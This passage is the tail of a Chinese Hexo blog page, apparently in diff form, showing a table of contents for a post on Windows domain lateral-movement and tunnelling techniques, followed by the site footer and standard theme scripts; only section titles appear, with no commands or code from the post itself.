明文传递）</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#wmiexec"><span class="nav-text">wmiexec</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8WMI%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8"><span class="nav-text">域横向移动WMI服务利用</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#WMI%E8%AE%A2%E9%98%85%E4%BA%8B%E4%BB%B6"><span class="nav-text">WMI订阅事件</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="nav-text">总结：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%BB%A5%E4%B8%8A%E6%9C%8D%E5%8A%A1hash%E6%89%B9%E9%87%8F%E5%88%A9%E7%94%A8-python%E7%BC%96%E8%AF%91exe"><span class="nav-text">域横向移动以上服务hash批量利用-python编译exe</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91COM%E5%92%8CDCOM"><span class="nav-text">域横向COM和DCOM</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-COM"><span class="nav-text">1. COM</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-DCOM"><span class="nav-text">2. DCOM</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%80%9A%E8%BF%87DCOM%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-text">通过DCOM横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-MMC20-Application"><span class="nav-text">1.MMC20.Application</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91PTH-amp-PTK-amp-PTT"><span class="nav-text">域横向PTH&amp;PTK&amp;PTT</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#PTH-%E5%88%A9%E7%94%A8LM%E6%88%96NTLM%E7%9A%84%E5%80%BC%E8%BF%9B%E8%A1%8C%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="nav-text">PTH  利用LM或NTLM的值进行的渗透测试</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#PTT-%E5%88%A9%E7%94%A8%E7%A5%A8%E6%8D%AE%E5%87%AD%E8%AF%81TGT%E8%BF%9B%E8%A1%8C%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="nav-text">PTT   利用票据凭证TGT进行的渗透测试</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#PTK-%E5%88%A9%E7%94%A8ekeys-aes256%E8%BF%9B%E8%A1%8C%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="nav-text">PTK   利用ekeys   aes256进行的渗透测试</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PTH%E4%BC%A0%E9%80%92-mimikatz"><span class="nav-text">PTH传递-mimikatz</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E7%99%BB%E5%85%A5%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="nav-text">利用哈希传递登入远程桌面</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PTK%E4%BC%A0%E9%80%92-mimikatz"><span class="nav-text">PTK传递-mimikatz</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PTT%E4%BC%A0%E9%80%92-MS140-68-amp-kekoo-amp"><span class="nav-text">PTT传递-MS140-68&amp;kekoo&amp;</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#MS14068%EF%BC%9A%E5%8F%AF%E4%BB%A5%E5%AE%9E%E7%8E%B0%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E7%9B%B4%E6%8E%A5%E5%90%8E%E5%8E%BB%E5%9F%9F%E6%8E%A7system%E6%9D%83%E9%99%90"><span class="nav-text">MS14068：可以实现普通用户直接后去域控system权限</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#lodon%E5%B7%A5%E5%85%B7"><span class="nav-text">lodon工具</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91cobaltstrike-amp-RDP"><span class="nav-text">域横向cobaltstrike&amp;RDP</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#RDP%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%BF%9E%E6%8E%A5"><span class="nav-text">RDP明文密码连接</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#RDP%E5%AF%86%E6%96%87HASH%E9%93%BE%E6%8E%A5"><span class="nav-text">RDP密文HASH链接</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8SPN%E6%9C%8D%E5%8A%A1-%E6%8E%A2%E9%92%88-%E8%AF%B7%E6%B1%82-%E5%AF%BC%E5%87%BA-%E7%A0%B4%E8%A7%A3-%E9%87%8D%E5%86%99"><span class="nav-text">域横向移动SPN服务-探针-请求-导出-破解-重写</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%8E%A2%E9%92%88"><span class="nav-text">探针</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82"><span class="nav-text">请求</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AF%BC%E5%87%BA"><span class="nav-text">导出</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%A0%B4%E8%A7%A3"><span class="nav-text">破解</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E9%87%8D%E5%86%99"><span class="nav-text">重写</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#CobaltStrike%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="nav-text">CobaltStrike工具使用</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E6%8F%90%E6%9D%83%E5%8F%8A%E6%8F%92%E4%BB%B6%E5%8A%A0%E8%BD%BD"><span class="nav-text">关于提权及插件加载</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-text">信息收集</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8socks%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="nav-text">域横向内网漫游socks代理隧道技术</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%86%85%E7%BD%91%EF%BC%9A%E5%85%B7%E6%9C%89%E7%A7%81%E6%9C%89%E7%BD%91%E6%AE%B5%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%A6%8210-x2F-8%EF%BC%8C172-16-x2F-12%EF%BC%8C192-168-x2F-16%E7%AD%89%E8%BF%99%E4%BA%9B%E5%8F%AF%E7%A7%B0%E4%B8%BA%E5%86%85%E7%BD%91%E7%BD%91%E6%AE%B5"><span class="nav-text">内网：具有私有网段地址，如10&#x2F;8，172.16&#x2F;12，192.168&#x2F;16等这些可称为内网网段</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E5%92%8C%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="nav-text">正向连接和反向连接</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BB%A3%E7%90%86%E5%92%8C%E9%9A%A7%E9%81%93%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-text">代理和隧道的区别</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FNgrok%E6%B5%8B%E8%AF%95%E6%BC%94%E7%A4%BA-%E4%B8%A4%E4%B8%AA%E5%86%85%E7%BD%91%E9%80%9A%E8%AE%AF%E4%B8%8A%E7%BA%BF"><span class="nav-text">内网穿透Ngrok测试演示-两个内网通讯上线</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FFrp%E8%87%AA%E5%BB%BA%E8%B7%B3%E6%9D%BF%E6%B5%8B%E8%AF%95-%E4%B8%A4%E4%B8%AA%E5%86%85%E7%BD%91%E9%80%9A%E8%AE%AF%E4%B8%8A%E7%BA%BF"><span class="nav-text">内网穿透Frp自建跳板测试-两个内网通讯上线</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E7%8E%AF%E5%A2%83"><span class="nav-text">实战环境</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C-amp-%E4%BC%A0%E8%BE%93-amp-%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="nav-text">域横向网络&amp;传输&amp;应用层隧道技术</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%89%8D%E6%9C%9F%E7%9A%84%E5%BF%85%E5%A4%87%E6%9D%A1%E4%BB%B6"><span class="nav-text">隧道技术前期的必备条件</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E9%9A%A7%E9%81%93%E5%8E%9F%E7%90%86"><span class="nav-text">隧道原理</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E5%B1%82%E8%BF%9E%E9%80%9A%E6%80%A7%E6%A3%80%E6%B5%8B"><span class="nav-text">网络应用层连通性检测</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%A3%80%E6%B5%8BTCP%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80%EF%BC%9Anetcat%EF%BC%89"><span class="nav-text">检测TCP协议（瑞士军刀：netcat）</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#HTTP%E5%8D%8F%E8%AE%AE"><span class="nav-text">HTTP协议</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#DNS%E5%8D%8F%E8%AE%AE"><span class="nav-text">DNS协议</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#pingtunnel%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-text">pingtunnel工具的使用</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%E5%88%86%E6%9E%90"><span class="nav-text">靶场分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93-1"><span class="nav-text">横向移动中的文件传输</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB-1"><span class="nav-text">通过网络共享</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%90%AD%E5%BB%BASMB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-text">搭建SMB服务器</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E9%80%9A%E8%BF%87windows%E8%87%AA%E5%B8%A6%E5%B7%A5%E5%85%B7"><span class="nav-text">通过windows自带工具</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+
+
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">yuBetter</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        VISITOR COUNT&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        TOTAL PAGE VIEWS&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a></span>
+                <br> 
+            <span class="theme-version-container">THEME&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v1.2.1</a>
+        </div>
+        
+        
+        
+            <div id="start_time_div" style="display:none">
+                2023/3/8 00:00:00
+            </div>
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+        
+            <script async data-pjax>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="unfolded-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="fa-regular fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="folded-tools-list">
+        <li class="right-bottom-tools tool-toggle-show flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/menu-shrink.js"></script>
+
+<script src="/js/tools/go-top-bottom.js"></script>
+
+<script src="/js/tools/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/tools/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/tools/code-block.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/layouts/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/tools/toc-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            REDEFINE.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            REDEFINE.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            REDEFINE.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
